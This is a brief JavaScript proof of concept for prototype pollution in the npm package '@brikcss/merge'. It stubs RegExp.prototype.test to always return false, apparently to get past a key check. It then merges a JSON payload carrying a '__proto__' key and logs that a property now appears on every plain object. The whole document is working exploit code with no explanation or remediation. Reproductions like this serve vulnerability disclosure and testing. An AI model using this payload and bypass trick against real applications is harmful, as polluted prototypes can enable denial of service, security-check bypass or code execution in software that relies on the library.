RegExp.prototype.test = () => false;
const merge = require('@brikcss/merge');
let obj = {};
let malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);